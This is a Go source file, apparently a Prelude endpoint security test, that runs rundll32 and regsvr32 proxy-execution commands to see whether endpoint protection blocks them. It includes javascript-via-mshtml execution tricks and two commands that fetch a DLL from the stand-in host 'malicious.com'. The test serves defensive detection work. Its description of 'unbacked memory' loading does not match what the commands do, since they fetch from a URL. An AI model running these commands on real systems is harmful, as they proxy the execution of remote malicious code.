//go:build windows
// +build windows

/*
ID: 226df8a0-6ef8-4965-91b4-7ce64078c206
NAME: Rundll32 or Regsvr32 Loaded a DLL from Unbacked Memory
CREATED: 2024-07-01
scenario: rundll32/regsvr32 loading DLL from unbacked memory region
abused to proxy execution of malicious libraries
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	Endpoint "github.com/preludeorg/test/endpoint"
)

func main() {
	Endpoint.Say("[+] Starting Rundll32 or Regsvr32 Loaded a DLL from Unbacked Memory VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	executeCommand := func(command string) {
		if !Endpoint.IsAvailable("cmd.exe") {
			Endpoint.Say("[+] Command execution is not available")
			Endpoint.Stop(126) // PROTECTED: Access Denied
		}

		out, err := exec.Command("cmd.exe", "/C", command).CombinedOutput()
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to execute command: %s", string(out)))
			Endpoint.Stop(1) // ERROR
		}

		Endpoint.Say(fmt.Sprintf("[+] Successfully executed command: %s", command))

		if strings.Contains(string(out), "Access Denied") {
			Endpoint.Say("[+] Process execution was blocked")
			Endpoint.Stop(126) // PROTECTED: Access Denied
		}
	}

	commands := []string{
		"rundll32.exe shell32.dll,Control_RunDLL",
		"regsvr32.exe /s /u shell32.dll",
		"rundll32.exe shell32.dll,ShellExec_RunDLL",
		"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();Close();",
		"regsvr32.exe /s /u javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();Close();",
	}
	for _, command := range commands {
		executeCommand(command)
	}

	// simulate DLL loading from unbacked memory
	dllLoadingCommands := []string{
		"rundll32.exe shell32.dll,ShellExec_RunDLL http://malicious.com/malicious.dll",
		"regsvr32.exe /s /u http://malicious.com/malicious.dll",
	}

	for _, command := range dllLoadingCommands {
		executeCommand(command)
	}
	Endpoint.Stop(101) // UNprotected
}

func cleanup() {
	// No specific cleanup actions required for this VST
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}